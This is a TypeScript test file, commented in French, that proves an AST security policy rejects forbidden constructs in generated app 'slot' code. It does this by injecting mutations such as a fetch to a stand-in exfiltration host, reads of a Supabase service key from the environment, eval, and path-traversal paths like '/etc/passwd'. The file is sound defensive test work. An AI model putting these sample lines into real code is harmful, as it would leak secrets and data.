// PREUVES DE LA POLITIQUE AST (Phase 9 — critère de sortie ROADMAP :
// « les gardes AST mordent — preuve par MUTATION »).
//
// Méthode : on part d'une implémentation CONFORME, puis on applique une
// mutation UNIQUE et ciblée par interdit. Un test qui ne verrait jamais le
// cas conforme passer ne prouverait rien (il pourrait refuser tout) ; un
// test qui ne verrait jamais la mutation être refusée ne prouverait rien non
// plus. Les deux sens sont donc exercés.
//
// Les DÉCLARATIONS de slots viennent du CORPUS GELÉ réel (jamais modifié) :
// la politique est ainsi éprouvée contre les contrats que le moteur produit
// vraiment, pas contre une maquette de test.
import { readFileSync } from "node:fs";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { describe, expect, it } from "vitest";
import { checkSlotBundle, checkSlotImplementation } from "../src/policy.ts";
import { checkPatchScope } from "../src/patch-policy.ts";
import type { SlotDeclaration, SlotImplementation } from "../src/contracts.ts";

const HERE = dirname(fileURLToPath(import.meta.url));
const CORPUS = join(HERE, "..", "..", "golden-corpus", "corpus-v2", "resto-quartier.air.json");
const air = JSON.parse(readFileSync(CORPUS, "utf8")) as { slots: SlotDeclaration[] };
const declarations = air.slots;
const declarationOf = (id: string): SlotDeclaration => {
  const found = declarations.find((d) => d.id === id);
  if (found === undefined) throw new Error(`déclaration absente du corpus : ${id}`);
  return found;
};

const STATUT = declarationOf("slot_libelle_statut_commande");
const PRIX = declarationOf("slot_format_prix_fcfa");

// Implémentation CONFORME de référence (pure, synchrone, sans import).
const CONFORME = `// Slot conforme.
interface Entrees {
  statut: string;
}
interface Sorties {
  libelle: string;
  annulable: boolean;
}
const LIBELLES = {
  recue: "Reçue",
  en_preparation: "En préparation",
  prete: "Prête",
  retiree: "Retirée",
};
export function runSlot(entrees: Entrees): Sorties {
  const libelle = LIBELLES[entrees.statut as keyof typeof LIBELLES] ?? entrees.statut;
  return { libelle, annulable: entrees.statut === "recue" };
}
`;

const impl = (source: string, slotId = "slot_libelle_statut_commande"): SlotImplementation => ({
  slotId,
  source,
  authorId: "test",
});

const codes = (source: string, decl: SlotDeclaration = STATUT): string[] =>
  checkSlotImplementation(impl(source, decl.id), decl).map((v) => v.code);

describe("politique AST — cas CONFORME (contrôle positif)", () => {
  it("accepte une implémentation pure, synchrone, sans import", () => {
    expect(checkSlotImplementation(impl(CONFORME), STATUT)).toEqual([]);
  });

  it("accepte un import EXPLICITEMENT autorisé par l'AIR", () => {
    const source = `import { format } from "intl";
export function runSlot(e: { montant: number }): { libelle: string } {
  return { libelle: format(e.montant) };
}
`;
    expect(checkSlotImplementation(impl(source, PRIX.id), PRIX)).toEqual([]);
  });
});

describe("politique AST — mutations REFUSÉES (une par interdit)", () => {
  it("accès réseau direct : fetch", () => {
    const source = CONFORME.replace(
      "const libelle =",
      "const distant = fetch(\"https://exfiltration.example/collect\");\n  const libelle =",
    );
    expect(codes(source)).toContain("SLOT_NETWORK_ACCESS");
  });

  it("accès réseau direct : XMLHttpRequest / WebSocket", () => {
    expect(codes(CONFORME.replace("const libelle =", "const x = new XMLHttpRequest();\n  const libelle ="))).toContain(
      "SLOT_NETWORK_ACCESS",
    );
    expect(codes(CONFORME.replace("const libelle =", "const w = new WebSocket(\"wss://x\");\n  const libelle ="))).toContain(
      "SLOT_NETWORK_ACCESS",
    );
  });

  it("import relatif vers une copie de bloc", () => {
    const source = `import { ListBlock } from "../lib/blocks/components";\n${CONFORME}`;
    expect(codes(source)).toContain("SLOT_IMPORT_RELATIVE");
  });

  it("import hors allowlist AIR", () => {
    const source = `import axios from "axios";\n${CONFORME}`;
    expect(codes(source)).toContain("SLOT_IMPORT_FORBIDDEN");
  });

  it("import autorisé pour un AUTRE slot n'est pas autorisé ici", () => {
    const source = `import { format } from "intl";\n${CONFORME}`;
    // "intl" est dans l'allowlist de slot_format_prix_fcfa, PAS dans celle
    // de slot_libelle_statut_commande : l'allowlist est bien PAR SLOT.
    expect(codes(source)).toContain("SLOT_IMPORT_FORBIDDEN");
  });

  it("require CommonJS", () => {
    expect(codes(CONFORME.replace("const libelle =", "const fs = require(\"node:fs\");\n  const libelle ="))).toContain(
      "SLOT_REQUIRE",
    );
  });

  it("accès aux secrets d'environnement", () => {
    expect(codes(CONFORME.replace("const libelle =", "const k = process.env.SUPABASE_SERVICE_KEY;\n  const libelle ="))).toContain(
      "SLOT_SECRET_ACCESS",
    );
    expect(codes(CONFORME.replace("const libelle =", "const g = globalThis;\n  const libelle ="))).toContain(
      "SLOT_SECRET_ACCESS",
    );
  });

  it("exécution dynamique : eval / new Function", () => {
    expect(codes(CONFORME.replace("const libelle =", "eval(\"1+1\");\n  const libelle ="))).toContain("SLOT_DYNAMIC_EVAL");
    expect(codes(CONFORME.replace("const libelle =", "const f = new Function(\"return 1\");\n  const libelle ="))).toContain(
      "SLOT_DYNAMIC_EVAL",
    );
  });

  it("import dynamique", () => {
    expect(codes(CONFORME.replace("const libelle =", "const m = import(\"axios\");\n  const libelle ="))).toContain(
      "SLOT_DYNAMIC_IMPORT",
    );
  });

  it("asynchronie : async/await, Promise, setTimeout", () => {
    expect(codes(CONFORME.replace("export function runSlot", "export async function runSlot"))).toContain(
      "SLOT_ASYNC_FORBIDDEN",
    );
    expect(codes(CONFORME.replace("const libelle =", "const p = Promise.resolve(1);\n  const libelle ="))).toContain(
      "SLOT_ASYNC_FORBIDDEN",
    );
    expect(codes(CONFORME.replace("const libelle =", "setTimeout(() => undefined, 10);\n  const libelle ="))).toContain(
      "SLOT_ASYNC_FORBIDDEN",
    );
  });

  it("non-déterminisme ambiant : Date, Math.random", () => {
    expect(codes(CONFORME.replace("const libelle =", "const t = Date.now();\n  const libelle ="))).toContain(
      "SLOT_AMBIENT_NONDETERMINISM",
    );
    expect(codes(CONFORME.replace("const libelle =", "const r = Math.random();\n  const libelle ="))).toContain(
      "SLOT_AMBIENT_NONDETERMINISM",
    );
  });

  it("Math reste utilisable hors de son générateur pseudo-aléatoire", () => {
    expect(codes(CONFORME.replace("const libelle =", "const a = Math.round(1.5);\n  const libelle ="))).toEqual([]);
  });

  it("effet de bord au chargement du module", () => {
    expect(codes(`console.log("chargement");\n${CONFORME}`)).toContain("SLOT_TOPLEVEL_EFFECT");
    expect(codes(`const t = Object.keys({});\n${CONFORME}`)).toContain("SLOT_TOPLEVEL_EFFECT");
    expect(codes(`let compteur = 0;\n${CONFORME}`)).toContain("SLOT_TOPLEVEL_EFFECT");
  });

  it("forme de sortie : nom, unicité, arité", () => {
    expect(codes(CONFORME.replace("export function runSlot", "export function calcule"))).toContain("SLOT_EXPORT_SHAPE");
    expect(codes(`${CONFORME}\nexport function bis(): number {\n  return 1;\n}\n`)).toContain("SLOT_EXPORT_SHAPE");
    expect(codes(CONFORME.replace("runSlot(entrees: Entrees)", "runSlot(entrees: Entrees, extra: number)"))).toContain(
      "SLOT_EXPORT_SHAPE",
    );
    // Export par défaut : le registre émis importe `runSlot` PAR SON NOM.
    expect(codes(`export default function runSlot(e: { statut: string }): number {\n  return e.statut.length;\n}\n`)).toContain(
      "SLOT_EXPORT_SHAPE",
    );
  });

  it("source syntaxiquement invalide", () => {
    expect(codes("export function runSlot( {")).toContain("SLOT_SYNTAX_ERROR");
  });

  it("slot non déclaré dans l'AIR", () => {
    const found = checkSlotImplementation(impl(CONFORME, "slot_inconnu"), undefined);
    expect(found.map((v) => v.code)).toEqual(["SLOT_UNDECLARED"]);
  });
});

describe("politique AST — l'analyse est un AST, pas une recherche de texte", () => {
  // Preuve DISCRIMINANTE : ces deux sources contiennent littéralement les
  // chaînes interdites. Un cliquet par expression régulière les refuserait ;
  // l'analyse syntaxique voit un commentaire et une chaîne, et les accepte.
  it("un commentaire mentionnant fetch/process n'est pas une violation", () => {
    const source = `// Ce slot n'utilise ni fetch( ni process.env — voir la politique.\n${CONFORME}`;
    expect(codes(source)).toEqual([]);
  });

  it("une chaîne de caractères contenant fetch n'est pas une violation", () => {
    const source = CONFORME.replace(
      "const libelle =",
      "const trace = \"fetch(process.env.SECRET)\";\n  const libelle =",
    );
    expect(codes(source)).toEqual([]);
  });

  it("un alias d'identifiant interdit reste détecté", () => {
    // Contre-épreuve du test précédent : la MÊME analyse voit l'usage réel.
    expect(codes(CONFORME.replace("const libelle =", "const f = fetch;\n  const libelle ="))).toContain(
      "SLOT_NETWORK_ACCESS",
    );
  });
});

describe("verdict de bundle", () => {
  it("bundle conforme = verdict positif", () => {
    const verdict = checkSlotBundle([impl(CONFORME)], declarations);
    expect(verdict.passed).toBe(true);
    expect(verdict.violations).toEqual([]);
  });

  it("deux implémentations du même slot = refus", () => {
    const verdict = checkSlotBundle([impl(CONFORME), impl(CONFORME)], declarations);
    expect(verdict.passed).toBe(false);
    expect(verdict.violations.map((v) => v.code)).toContain("SLOT_DUPLICATE");
  });
});

describe("politique de périmètre des patchs (§3, §10)", () => {
  it("une édition sous slots/ est autorisée", () => {
    expect(checkPatchScope([{ path: "slots/slot_x.ts", content: "" }]).passed).toBe(true);
  });

  it("l'édition d'une COPIE DE BLOC est refusée", () => {
    const verdict = checkPatchScope([{ path: "lib/blocks/components.tsx", content: "" }]);
    expect(verdict.passed).toBe(false);
    expect(verdict.violations[0]?.code).toBe("PATCH_BLOCK_COPY_EDIT");
  });

  it("design system, runtime, écrans et manifestes sont protégés", () => {
    const paths = [
      "lib/primitives/primitives.tsx",
      "lib/tokens/theme.generated.ts",
      "lib/runtime/air-runtime.tsx",
      "screens/scr_menu.tsx",
      "manifests/permissions.manifest.json",
      "navigation.tsx",
      "App.tsx",
      "app.json",
    ];
    for (const path of paths) {
      expect(checkPatchScope([{ path, content: "" }]).passed, path).toBe(false);
    }
  });

  it("les chemins remontants ou absolus sont refusés", () => {
    expect(checkPatchScope([{ path: "slots/../lib/blocks/components.tsx", content: "" }]).violations[0]?.code).toBe(
      "PATCH_PATH_TRAVERSAL",
    );
    expect(checkPatchScope([{ path: "/etc/passwd", content: "" }]).violations[0]?.code).toBe("PATCH_PATH_TRAVERSAL");
  });
});
